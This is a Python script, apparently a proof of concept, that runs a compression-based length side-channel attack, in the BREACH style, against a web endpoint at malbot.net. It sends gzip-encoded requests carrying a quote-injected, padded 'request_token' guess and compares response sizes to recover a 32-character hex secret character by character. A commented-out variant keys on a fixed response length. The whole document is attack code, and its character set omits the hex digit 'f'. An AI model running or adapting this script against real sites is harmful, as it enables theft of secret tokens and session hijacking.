import urllib.parse
import urllib.request

def enviarPeticion(req,secreto,extra):
    url = 'http://malbot.net/poc/?request_token=%27' + secreto + extra
    print(url)
    req = urllib.request.Request(url)
    req.add_header('User-Agent','Mozilla/5.0 (Windows NT 6.1; Win64; x64)')
    req.add_header('Accept-Encoding','gzip, deflate')
    return req
req=0
longitud=32
i=1
j=0
menor=100000
secreto = ''
index=0
caracteres=[48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 97, 98, 99, 100, 101]
for j in range(32):
    menor=100000
    for i in range(len(caracteres)):
        caracter = chr(caracteres[i])
        req = enviarPeticion(req,secreto+caracter, '@'*(32-len(secreto))+'%27')
        with urllib.request.urlopen(req) as response:
            the_page = response.read()
            print(len(the_page))
            if(len(the_page)<=menor):
                index = i
                menor=len(the_page) 
                if(len(the_page)==menor):
                    req = enviarPeticion(req, secreto, '@' + caracter*(32-len(secreto))+'%27')
                    with urllib.request.urlopen(req) as response:
                        the_page = response.read()
                        print(len(the_page))
                        if(len(the_page)>menor):
                            index = i
                print(chr(caracteres[index]))
    secreto = secreto + chr(caracteres[index])
    print(secreto)       
'''while True:
    url = url + '@'
    req=enviarPeticion(req,url)
    with urllib.request.urlopen(req) as response:
        the_page = response.read()
        print(len(the_page))
        asciichar = 49 + j
        if(len(the_page)!=2556):
            if (asciichar-1 ==57):
                j=j+39
            print(chr(asciichar))
            if (url[-4:]!='%27@'):
                url=url[:-2] + chr(asciichar)
            j=j+1
        else:
            secreto = secreto + chr(asciichar-1)
            print(secreto)
            url=url[:-1] + chr(asciichar-1)
            j=0 
            i = i +1
    if (longitud == i):
        print(url[-32:-1]) 
        break
'''
